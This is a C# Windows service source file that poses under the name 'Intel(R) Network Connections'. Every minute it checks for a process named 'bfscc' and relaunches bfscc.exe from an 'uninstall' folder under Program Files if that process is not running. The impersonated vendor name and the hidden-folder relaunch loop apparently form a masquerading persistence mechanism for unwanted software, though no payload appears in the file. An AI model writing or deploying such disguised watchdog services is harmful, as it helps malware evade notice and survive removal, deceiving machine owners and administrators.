using System;
using System.Diagnostics;
using System.ServiceProcess;
using System.Runtime.InteropServices;
using static WindowsService.Utils;
using System.Threading;

namespace WindowsService
{

    public partial class Service1 : ServiceBase
    {
        private int eventId = 1;
        public Service1()
        {
            InitializeComponent();
            this.ServiceName = "Intel(R) Network Connections";

            eventLog1 = new System.Diagnostics.EventLog();
            if (!EventLog.SourceExists("MySource"))
            {
                EventLog.CreateEventSource("MySource", "MyNewLog");
            }
            eventLog1.Source = "MySource";
            eventLog1.Log = "MyNewLog";

        }

        protected override void OnStart(string[] args)
        {
            eventLog1.WriteEntry("In OnStart");

            // Set up a timer to trigger every minute.  
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Interval = 60000; // 20 seconds  
            timer.Elapsed += new System.Timers.ElapsedEventHandler(this.OnTimer);
            timer.Start();

            // Update the service state to Start Pending.  
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING;
            serviceStatus.dwWaitHint = 100000;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);

            // Update the service state to Running.  
            serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
        }

        protected override void OnStop()
        {
            base.OnStop();
            eventLog1.WriteEntry("In onStop.");
            Console.WriteLine("Stop");
            //Thread.Sleep(20000); //20 sec
            //ServiceController service = new ServiceController("Intel(R) Network Connections");
            //service.Start();
        }


        protected override void OnShutdown()
        {
            base.OnShutdown();
        }

        public void OnTimer(object sender, System.Timers.ElapsedEventArgs args)
        {
            // TODO: Insert monitoring activities here.  
            String filePath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Intel\Intel(R) Network Connections\uninstall\bfscc.exe";
            
            if (!ExistProcess("bfscc"))
            {
                Utils.ExecuteConsole(filePath);
            }
            eventLog1.WriteEntry("Monitoring the System", EventLogEntryType.Information, eventId++);

        }

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetServiceStatus(IntPtr handle, ref ServiceStatus serviceStatus);
    }
}
